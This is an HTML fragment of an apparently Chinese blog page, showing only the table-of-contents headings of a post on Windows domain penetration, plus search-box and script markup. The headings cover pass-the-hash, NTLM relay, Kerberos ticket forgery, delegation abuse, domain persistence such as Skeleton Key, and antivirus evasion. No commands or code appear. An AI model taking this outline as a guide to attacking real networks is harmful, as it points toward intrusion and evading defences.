class="toc-link" href="#5-2-PTH"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-1-impacket%E5%A5%97%E4%BB%B6"><span class="toc-number">5.2.1.</span> <span class="toc-text">5.2.1 impacket套件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-2-Invoke-TheHash%E5%A5%97%E4%BB%B6"><span class="toc-number">5.2.2.</span> <span class="toc-text">5.2.2 Invoke-TheHash套件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-3-mimikatz"><span class="toc-number">5.2.3.</span> <span class="toc-text">5.2.3 mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-NTLM-Relay"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 NTLM-Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-1-LLMNR"><span class="toc-number">5.3.1.</span> <span class="toc-text">5.3.1 LLMNR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-2-WPAD"><span class="toc-number">5.3.2.</span> <span class="toc-text">5.3.2 WPAD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 域信任</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-%E6%94%BB%E5%87%BBKerberos"><span class="toc-number">5.5.</span> <span class="toc-text">5.5 攻击Kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-1-PTT"><span class="toc-number">5.5.1.</span> <span class="toc-text">5.5.1 PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-1-1-%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">5.5.1.1 金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-1-2-%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.5.1.2.</span> <span class="toc-text">5.5.1.2 银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-1-3-kekeo"><span class="toc-number">5.5.1.3.</span> <span class="toc-text">5.5.1.3 kekeo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-2-%E5%A7%94%E6%B4%BE"><span class="toc-number">5.5.2.</span> <span class="toc-text">5.5.2 委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-2-1-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.5.2.1.</span> <span class="toc-text">5.5.2.1 基于资源的约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-2-2-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.5.2.2.</span> <span class="toc-text">5.5.2.2 非约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-2-3-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.5.2.3.</span> <span class="toc-text">5.5.2.3 约束委派</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E7%BB%B4%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">域维权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-DSRM"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 DSRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-GPO"><span class="toc-number">6.2.</span> <span class="toc-text">6.2 GPO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-SSP"><span class="toc-number">6.3.</span> <span class="toc-text">6.3 SSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-Skeleton-Key"><span class="toc-number">6.4.</span> <span class="toc-text">6.4 Skeleton Key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-Hook-PasswordChangeNotify"><span class="toc-number">6.5.</span> <span class="toc-text">6.5 Hook PasswordChangeNotify</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E5%A4%84%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">免杀处理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-Powershell%E7%BB%95%E8%BF%87"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 Powershell绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E6%8A%93%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 抓密码工具免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80"><span class="toc-number">7.3.</span> <span class="toc-text">7.3 源码免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-4-%E7%99%BD%E5%90%8D%E5%8D%95%E5%85%8D%E6%9D%80"><span class="toc-number">7.4.</span> <span class="toc-text">7.4 白名单免杀</span></a></li></ol></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <div id="nexmoe-search-space">
	<div class="search-container">
		<div class="search-header">
			<div class="search-input-container">
				<input
					class="search-input"
					type="text"
					placeholder="搜索"
					oninput="sinput();"
				/>
			</div>
			<a class="search-close" onclick="sclose();">×</a>
		</div>
		<div class="search-body"></div>
	</div>
</div>

    
<script src="/lib/mdui_043tiny/mdui.js"></script>
<script src="/lib/fancybox/fancybox.umd.js"></script>


 

<script async src="/js/app.js?v=1665474214469"></script>



</body>

</html>
